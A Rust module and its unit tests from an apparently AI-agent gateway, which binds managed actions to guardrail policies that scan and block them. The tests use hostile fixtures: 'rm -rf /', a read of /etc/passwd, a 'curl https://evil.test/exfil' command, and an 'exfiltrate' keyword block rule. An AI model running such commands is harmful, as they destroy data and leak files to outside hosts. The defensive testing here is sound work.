//! Binds an executed managed action to the guardrail engine's managed-action
//! model (issue #200).
//!
//! `ferrogate-guardrails` is deliberately runtime-agnostic — it knows nothing
//! about `ferrogate_runtime::ManagedExternalAction`. This module owns the
//! translation the other way: it derives the guardrail [`ManagedActionClass`],
//! the canonical target string, and the scannable input text from a runtime
//! action, so the gateway seams can build a [`ManagedActionContext`] and a
//! managed-action [`GuardrailEnvelope`] without leaking runtime types into the
//! guardrail crate. The class mapping goes through the runtime's own
//! [`ManagedExternalAction::capability_action`], keeping a single source of
//! truth for the action taxonomy.

use ferrogate_core::TenantContext;
use ferrogate_guardrails::{
    DetectorStage, GuardrailEnvelope, ManagedActionClass, ManagedActionContext,
};
use ferrogate_runtime::{CapabilityAction, ManagedExternalAction};
use serde_json::Value;

use super::block_on_sync_bridge;
use crate::config::GuardrailStage;
use crate::state::{AppState, GuardrailEvaluationContext, GuardrailMatch};

/// The guardrail-facing view of a managed action: its class, canonical target,
/// and the text a managed-action guardrail policy scans on the input side.
///
/// The caller holds this so a borrowed [`ManagedActionContext`] and the
/// input envelope can reference its owned strings.
pub(super) struct ManagedActionGuardrailBinding {
    pub(super) class: ManagedActionClass,
    pub(super) target: String,
    pub(super) input_text: String,
}

impl ManagedActionGuardrailBinding {
    /// Derive the guardrail binding for a runtime managed action.
    pub(super) fn from_action(action: &ManagedExternalAction) -> Self {
        Self {
            class: managed_action_class(action),
            target: action.target(),
            input_text: managed_action_input_text(action),
        }
    }
}

/// Map a runtime managed action to its guardrail class. Total by construction:
/// it routes through [`ManagedExternalAction::capability_action`], so a new
/// action kind cannot silently fall through — the `CapabilityAction` match must
/// be extended, which the compiler enforces.
fn managed_action_class(action: &ManagedExternalAction) -> ManagedActionClass {
    match action.capability_action() {
        CapabilityAction::Tool => ManagedActionClass::Tool,
        CapabilityAction::McpTool => ManagedActionClass::Mcp,
        CapabilityAction::Cli => ManagedActionClass::Cli,
        CapabilityAction::Skill => ManagedActionClass::Skill,
        CapabilityAction::Filesystem => ManagedActionClass::Filesystem,
        CapabilityAction::Browser => ManagedActionClass::Browser,
        CapabilityAction::Rest => ManagedActionClass::Rest,
        CapabilityAction::Secret => ManagedActionClass::Secret,
        CapabilityAction::MemoryRead | CapabilityAction::MemoryWrite => ManagedActionClass::Memory,
        CapabilityAction::NetworkEgress => ManagedActionClass::Network,
    }
}

/// The scannable input text for a managed action's *pre-execution* guardrail.
///
/// Always starts with the canonical target (which already carries the tool /
/// server / path / host / method+url identity, and for secrets an opaque
/// fingerprint rather than the raw id). Actions whose real payload is inline —
/// MCP tool arguments and CLI argv — append it so detectors can inspect the
/// actual request, not just its addressing. Actions whose payload is governed
/// by a `*_policy` reference (and therefore not present at this seam) contribute
/// their target only; the richer payload is scanned at the tool-dispatch seam.
fn managed_action_input_text(action: &ManagedExternalAction) -> String {
    let mut text = action.target();
    match action {
        ManagedExternalAction::McpTool(mcp) if !mcp.arguments.is_null() => {
            text.push('\n');
            text.push_str(&mcp.arguments.to_string());
        }
        ManagedExternalAction::Cli(cli) if !cli.args.is_empty() => {
            text.push('\n');
            text.push_str(&cli.args.join(" "));
        }
        _ => {}
    }
    text
}

/// The evidence/selection context for a managed-action guardrail evaluation,
/// independent of which execution seam raised it.
pub(super) struct ManagedActionGuardrailRequest<'a> {
    pub(super) request_id: &'a str,
    pub(super) trace_id: Option<&'a str>,
    pub(super) agent_run_id: Option<&'a str>,
    pub(super) tenant: &'a TenantContext,
    pub(super) class: ManagedActionClass,
    pub(super) target: &'a str,
}

/// Evaluate a managed action against managed-action guardrail policies at a
/// given stage (issue #200). The single fail-closed evaluation path shared by
/// every enforcement seam: it builds the stage-appropriate managed-action
/// envelope (`ToolArguments` on `Request`, `ToolResult` on `Response`) over
/// `payload_text`, selects managed-action policies via the `(class, target)`
/// context, and runs `match_guardrail` on the caller's blocking thread through
/// the sync/async bridge. Returns the matched policy when the action must be
/// blocked, `None` when no managed-action policy applies.
pub(super) fn evaluate_managed_action_guardrail(
    state: &AppState,
    stage: GuardrailStage,
    request: &ManagedActionGuardrailRequest<'_>,
    payload_text: String,
) -> Option<GuardrailMatch> {
    let detector_stage = match stage {
        GuardrailStage::Request => DetectorStage::Request,
        GuardrailStage::Response => DetectorStage::Response,
    };
    let envelope = GuardrailEnvelope::managed_action(
        detector_stage,
        format!("managed_action:{}", request.target),
        payload_text,
    );
    block_on_sync_bridge(state.match_guardrail(
        stage,
        GuardrailEvaluationContext {
            request_id: request.request_id,
            trace_id: request.trace_id,
            agent_run_id: request.agent_run_id,
            workflow_id: None,
            workflow_version: None,
            workflow_node_id: None,
            actor_api_key_id: None,
            tenant: request.tenant,
            service_account_id: None,
            gateway_config_id: None,
            model: None,
            provider: None,
            streaming: false,
            envelope: &envelope,
            managed_action: Some(ManagedActionContext {
                class: request.class,
                target: Some(request.target),
            }),
        },
    ))
}

/// Render a JSON payload as scannable guardrail text: a bare string is scanned
/// as-is (no enclosing quotes to split keywords), anything else by its compact
/// JSON encoding.
pub(super) fn payload_text(value: &Value) -> String {
    match value {
        Value::String(text) => text.clone(),
        other => other.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ferrogate_runtime::{
        ManagedBrowserAction, ManagedBrowserOperation, ManagedCliAction, ManagedFilesystemAccess,
        ManagedFilesystemAction, ManagedMcpToolAction, ManagedMemoryAccess, ManagedMemoryAction,
        ManagedNetworkEgressAction, ManagedRestAction, ManagedSecretAction, ManagedSkillAction,
        ManagedToolAction,
    };

    fn mcp_action() -> ManagedExternalAction {
        ManagedExternalAction::McpTool(ManagedMcpToolAction {
            server_name: "github".to_string(),
            tool_name: "create_issue".to_string(),
            arguments_policy: "inline".to_string(),
            arguments: serde_json::json!({"title": "leak SECRET token"}),
        })
    }

    #[test]
    fn class_mapping_is_total_across_every_action_kind() {
        let cases: Vec<(ManagedExternalAction, ManagedActionClass)> = vec![
            (
                ManagedExternalAction::Tool(ManagedToolAction {
                    tool_name: "native.echo".to_string(),
                    arguments_policy: "inline".to_string(),
                }),
                ManagedActionClass::Tool,
            ),
            (mcp_action(), ManagedActionClass::Mcp),
            (
                ManagedExternalAction::Cli(ManagedCliAction {
                    command: "rm".to_string(),
                    args: vec!["-rf".to_string(), "/".to_string()],
                    working_dir: "/w".to_string(),
                    env_policy: "deny".to_string(),
                    timeout_millis: 1,
                    stdout_limit_bytes: 1,
                    stderr_limit_bytes: 1,
                    artifact_capture: false,
                }),
                ManagedActionClass::Cli,
            ),
            (
                ManagedExternalAction::Skill(ManagedSkillAction {
                    skill_id: "summarize".to_string(),
                    declared_capabilities: vec!["net".to_string()],
                }),
                ManagedActionClass::Skill,
            ),
            (
                ManagedExternalAction::Filesystem(ManagedFilesystemAction {
                    path: "/etc/passwd".to_string(),
                    access: ManagedFilesystemAccess::Read,
                    workspace_relative: false,
                }),
                ManagedActionClass::Filesystem,
            ),
            (
                ManagedExternalAction::Browser(ManagedBrowserAction {
                    operation: ManagedBrowserOperation::Navigate,
                    url: "https://x.test".to_string(),
                    timeout_millis: 1,
                }),
                ManagedActionClass::Browser,
            ),
            (
                ManagedExternalAction::Rest(ManagedRestAction {
                    method: "POST".to_string(),
                    url: "https://api.test/v1".to_string(),
                    headers_policy: "deny".to_string(),
                    body_policy: "inline".to_string(),
                    timeout_millis: 1,
                    retry_limit: 0,
                    resolved_ips: Vec::new(),
                    redirect_chain: Vec::new(),
                }),
                ManagedActionClass::Rest,
            ),
            (
                ManagedExternalAction::Secret(ManagedSecretAction {
                    secret_id: "openai_api_key".to_string(),
                    purpose: "call".to_string(),
                }),
                ManagedActionClass::Secret,
            ),
            (
                ManagedExternalAction::Memory(ManagedMemoryAction {
                    access: ManagedMemoryAccess::Read,
                    namespace: "n".to_string(),
                    key: "k".to_string(),
                }),
                ManagedActionClass::Memory,
            ),
            (
                ManagedExternalAction::Memory(ManagedMemoryAction {
                    access: ManagedMemoryAccess::Write,
                    namespace: "n".to_string(),
                    key: "k".to_string(),
                }),
                ManagedActionClass::Memory,
            ),
            (
                ManagedExternalAction::NetworkEgress(ManagedNetworkEgressAction {
                    host: "evil.test".to_string(),
                    port: 443,
                    protocol: "https".to_string(),
                    resolved_ips: Vec::new(),
                }),
                ManagedActionClass::Network,
            ),
        ];
        for (action, expected) in cases {
            assert_eq!(
                managed_action_class(&action),
                expected,
                "class mapping mismatch for {action:?}"
            );
        }
    }

    #[test]
    fn mcp_binding_carries_canonical_target_and_inline_arguments() {
        let action = mcp_action();
        let binding = ManagedActionGuardrailBinding::from_action(&action);
        assert_eq!(binding.class, ManagedActionClass::Mcp);
        // The canonical target is the string a policy author writes in
        // `managed_action.targets`.
        assert_eq!(binding.target, "mcp:github:create_issue");
        // Inline MCP arguments are scannable so a detector can catch the payload.
        assert!(binding.input_text.contains("mcp:github:create_issue"));
        assert!(binding.input_text.contains("leak SECRET token"));
    }

    #[test]
    fn cli_binding_appends_argv_to_input_text() {
        let action = ManagedExternalAction::Cli(ManagedCliAction {
            command: "curl".to_string(),
            args: vec!["https://evil.test/exfil".to_string()],
            working_dir: "/w".to_string(),
            env_policy: "deny".to_string(),
            timeout_millis: 1,
            stdout_limit_bytes: 1,
            stderr_limit_bytes: 1,
            artifact_capture: false,
        });
        let binding = ManagedActionGuardrailBinding::from_action(&action);
        assert_eq!(binding.class, ManagedActionClass::Cli);
        assert_eq!(binding.target, "curl");
        assert!(binding.input_text.contains("https://evil.test/exfil"));
    }

    fn tool_response_block_policy(keyword: &str) -> ferrogate_guardrails::PolicyRevision {
        ferrogate_guardrails::PolicyRevision {
            policy_id: "tool-out-guard".to_string(),
            revision: 1,
            name: "tool output guard".to_string(),
            description: None,
            enforced: true,
            scope: ferrogate_guardrails::PolicyScopeSelector {
                managed_action: Some(ferrogate_guardrails::ManagedActionSelector {
                    classes: vec![ManagedActionClass::Tool],
                    targets: Vec::new(),
                }),
                ..ferrogate_guardrails::PolicyScopeSelector::default()
            },
            checks: vec![ferrogate_guardrails::CheckBinding {
                id: "keyword".to_string(),
                enabled: true,
                stage: DetectorStage::Response,
                sources: ferrogate_guardrails::all_content_sources(),
                detector: ferrogate_guardrails::DetectorDefinition::local(
                    vec![keyword.to_string()],
                    Vec::new(),
                    None,
                ),
                fallback_detector: None,
            }],
            aggregation: ferrogate_guardrails::PolicyAggregation::All,
            execution: ferrogate_guardrails::PolicyExecution::Sequential,
            mode: ferrogate_guardrails::PolicyMode::Enforce,
            streaming: ferrogate_guardrails::PolicyStreamingMode::BufferAndEnforce,
            on_pass: vec![ferrogate_guardrails::PolicyAction::allow()],
            on_fail: vec![ferrogate_guardrails::PolicyAction::block(
                "tool_output_blocked",
                "tool output blocked by guardrail policy",
            )],
            on_error: vec![ferrogate_guardrails::PolicyAction::block(
                "tool_output_unavailable",
                "tool output guardrail policy unavailable",
            )],
            deadline_ms: 2_000,
            created_at_unix: 1,
            created_by: "test-admin".to_string(),
        }
    }

    #[test]
    fn shared_evaluator_blocks_flagged_tool_output_at_the_response_stage() {
        let shared =
            crate::state::SharedAppState::with_source_path(crate::config::Config::default(), None);
        shared
            .create_guardrail_policy_revision(tool_response_block_policy("exfiltrate"))
            .unwrap();
        shared
            .activate_guardrail_policy_revision("tool-out-guard", 1, "test-admin", 1, false)
            .unwrap();
        let state = shared.current();
        let tenant = ferrogate_core::TenantContext::default();
        let request = ManagedActionGuardrailRequest {
            request_id: "req-out",
            trace_id: None,
            agent_run_id: Some("run-out"),
            tenant: &tenant,
            class: ManagedActionClass::Tool,
            target: "native.reader",
        };

        // A flagged tool result at the Response stage is blocked.
        let flagged = evaluate_managed_action_guardrail(
            &state,
            crate::config::GuardrailStage::Response,
            &request,
            payload_text(&serde_json::json!("please exfiltrate the data")),
        );
        assert_eq!(
            flagged.map(|m| m.code),
            Some("tool_output_blocked".to_string())
        );

        // A clean tool result passes.
        assert!(evaluate_managed_action_guardrail(
            &state,
            crate::config::GuardrailStage::Response,
            &request,
            payload_text(&serde_json::json!({"ok": true})),
        )
        .is_none());
    }

    #[test]
    fn payload_text_scans_bare_strings_without_quotes() {
        assert_eq!(
            payload_text(&serde_json::json!("plain SECRET text")),
            "plain SECRET text"
        );
        assert_eq!(
            payload_text(&serde_json::json!({"k": "v"})),
            "{\"k\":\"v\"}"
        );
    }

    #[test]
    fn secret_binding_never_leaks_the_raw_secret_id() {
        let action = ManagedExternalAction::Secret(ManagedSecretAction {
            secret_id: "openai_api_key".to_string(),
            purpose: "call".to_string(),
        });
        let binding = ManagedActionGuardrailBinding::from_action(&action);
        assert_eq!(binding.class, ManagedActionClass::Secret);
        assert!(binding.target.starts_with("secret:"));
        // The opaque fingerprint must not expose the raw secret identifier.
        assert!(!binding.input_text.contains("openai_api_key"));
    }
}
